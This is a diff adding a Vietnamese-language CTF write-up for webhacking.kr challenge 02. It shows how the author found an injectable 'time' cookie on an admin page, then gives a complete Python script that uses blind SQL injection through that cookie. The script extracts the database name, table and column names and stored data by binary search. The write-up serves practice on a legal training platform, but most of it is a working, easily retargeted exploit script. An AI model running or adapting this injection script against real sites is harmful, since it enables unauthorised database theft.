@@ -1,0 +1,214 @@
+---
+title: web-hacking.kr | Chall02
+date: 2025-08-09
+tags: [ctf, webhacking.kr]
+categories: [Writeups, CTF]
+author: bumbi.203_
+---
+
+# Chall02 
+
+## Giao diện web 
+
+![image](/assets/img/CTF/webhacking.kr/chall02/image1.png)
+
+## Khai thác 
+
+Đầu tiên mình cần check source của web này: 
+
+![image](/assets/img/CTF/webhacking.kr/chall02/image2.png)
+
+Tìm ra được 1 endpoint => `admin.php` 
+
+![image](/assets/img/CTF/webhacking.kr/chall02/image3.png)
+
+Chỗ này yêu cầu nhập 1 password. Vậy có thể là SQLi, nhưng khi thử các payload như `'` và `"` đều không thể hoạt động. 
+
+Nhưng mình kiểm tra trong phần cookie thì có các trường như sau: 
+
+![image](/assets/img/CTF/webhacking.kr/chall02/image4.png)
+
+Vậy trường này thì có thay đổi gì không ???
+
+Ban đầu, chưa chỉnh sửa thì nó như này: 
+
+![image](/assets/img/CTF/webhacking.kr/chall02/image5.png)
+
+Nên mình sẽ thay đổi nó thành `2025` thử. 
+
+![image](/assets/img/CTF/webhacking.kr/chall02/image6.png)
+
+Như vậy thì hoàn toàn có thể thay đổi của trường này. Nên mình tiếp tục thử thay đổi thành `True` và `False` rồi xem có gì thay đổi ko. 
+
+- Nếu inject `True` thì: 
+![image](/assets/img/CTF/webhacking.kr/chall02/image7.png)
+
+- Nếu inject `False` thì: 
+![image](/assets/img/CTF/webhacking.kr/chall02/image8.png)
+
+Từ đây, cũng đủ dữ kiện đã viết 1 script để xác định password thông qua blind Sqli. 
+
+```python
+import requests 
+import sys 
+
+url = "https://webhacking.kr/challenge/web-02/"
+cookies_base = {
+    "PHPSESSID": "vm8p1rs0kiduc21e44e4m0k8b9",
+}
+
+db_length = 0
+for i in range(1, 20):
+    payload = f"(LENGTH((SELECT DATABASE()))) = {i}"
+    cookie = cookies_base.copy()
+    cookie['time'] = payload 
+    res = requests.get(url, cookies=cookie)
+    if "2070-01-01 09:00:01" in res.text:
+        db_length = i 
+        print(f"Độ dài của tên cơ sở dữ liệu là: {db_length}")
+        break 
+
+db_name = ""
+for i in range(1, db_length + 1):
+    left = 32 
+    right = 126 
+    while left <= right: 
+        mid = (left + right) // 2 
+        payload = f"(ASCII(SUBSTRING((SELECT DATABASE()), {i}, 1)) > {mid})"
+        cookie = cookies_base.copy()
+        cookie['time'] = payload 
+        res = requests.get(url, cookies=cookie)
+        if "2070-01-01 09:00:01" in res.text:
+            left = mid + 1 
+        else:
+            right = mid - 1
+
+    db_name += chr(left) 
+    sys.stdout.write('\rTên của db hiện tại: ' + db_name)
+    sys.stdout.flush()
+
+table_length = 0 
+for i in range(1, 20):
+    payload = f"(LENGTH((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = '{db_name}'))) = {i}"
+    cookie = cookies_base.copy()
+    cookie['time'] = payload 
+    res = requests.get(url, cookies=cookie)
+    if "2070-01-01 09:00:01" in res.text:
+        table_length = i 
+        # print(f"\nĐộ dài của tên table là: {table_length}")
+        break
+
+# print("\nĐang lấy danh sách các table...")
+table_names = ""
+for i in range(1, table_length + 1):
+    left = 32 
+    right = 126 
+    while left <= right: 
+        mid = (left + right) // 2 
+        payload = f"(ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = '{db_name}'), {i}, 1)) > {mid})"
+        cookie = cookies_base.copy()
+        cookie['time'] = payload 
+        res = requests.get(url, cookies=cookie)
+        if "2070-01-01 09:00:01" in res.text:
+            left = mid + 1 
+        else:
+            right = mid - 1
+
+    table_names += chr(left) 
+    # sys.stdout.write('\rĐã lấy: ' + table_names)
+    # sys.stdout.flush()
+
+print("\n\nDanh sách các table:")
+table_name = table_names.split(",")
+for idx, name in enumerate(table_name):
+    print(f"{idx + 1}. {name}")    
+while True:
+    try:
+        choice = int(input("Chọn table để lấy data (nhập số): ")) - 1
+        if 0 <= choice < len(table_name):
+            selected_table = table_name[choice]
+            break
+        else:
+            print("Vui lòng nhập một số trong khoảng từ 1 đến", len(table_name)) 
+    except ValueError:
+        print("Vui lòng nhập một số nguyên.")
+
+print(f"\nĐang lấy danh sách các cột trong bảng {selected_table}...")
+column_length = 0 
+for i in range(1, 20): 
+    payload = f"(LENGTH((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = '{selected_table}'))) = {i}"
+    cookie = cookies_base.copy()
+    cookie['time'] = payload 
+    res = requests.get(url, cookies=cookie)
+    if "2070-01-01 09:00:01" in res.text:
+        column_length = i
+        break
+
+# print("\nĐang lấy danh sách các cột...")
+column_names = ""
+for i in range(1, column_length + 1):
+    left = 32 
+    right = 126 
+    while left <= right: 
+        mid = (left + right) // 2 
+        payload = f"(ASCII(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = '{selected_table}'), {i}, 1)) > {mid})"
+        cookie = cookies_base.copy()
+        cookie['time'] = payload 
+        res = requests.get(url, cookies=cookie)
+        if "2070-01-01 09:00:01" in res.text:
+            left = mid + 1 
+        else:
+            right = mid - 1
+
+    column_names += chr(left) 
+    # sys.stdout.write('\rĐã lấy: ' + column_names)
+    # sys.stdout.flush()
+
+print("\n\nDanh sách các cột:")
+column_name = column_names.split(",")
+for idx, name in enumerate(column_name):
+    print(f"{idx + 1}. {name}")
+while True:
+    try:
+        choice = int(input("Chọn cột để lấy data (nhập số): ")) - 1
+        if 0 <= choice < len(column_name):
+            selected_column = column_name[choice]
+            break
+        else:
+            print("Vui lòng nhập một số trong khoảng từ 1 đến", len(column_name)) 
+    except ValueError:
+        print("Vui lòng nhập một số nguyên.")
+
+print(f"\nĐang lấy dữ liệu từ bảng {selected_table} và cột {selected_column}...")
+
+data_length = 0
+for i in range(1, 20):
+    payload = f"(LENGTH((SELECT GROUP_CONCAT({selected_column}) FROM {selected_table}))) = {i}"
+    cookie = cookies_base.copy()
+    cookie['time'] = payload 
+    res = requests.get(url, cookies=cookie)
+    if "2070-01-01 09:00:01" in res.text:
+        data_length = i 
+        break
+data = ""
+for i in range(1, data_length + 1):
+    left = 32 
+    right = 126
+    while left <= right:
+        mid = (left + right) // 2
+        payload = f"(ASCII(SUBSTRING((SELECT {selected_column} FROM {selected_table}), {i}, 1))) > {mid}"
+        cookie = cookies_base.copy()
+        cookie['time'] = payload 
+        res = requests.get(url, cookies=cookie)
+        if "2070-01-01 09:00:01" in res.text:
+            left = mid + 1 
+        else:
+            right = mid - 1
+    data += chr(left)
+    sys.stdout.write('\rĐã lấy: ' + data)
+```
+
+![image](/assets/img/CTF/webhacking.kr/chall02/image9.png)
+
+![image](/assets/img/CTF/webhacking.kr/chall02/image10.png)
+
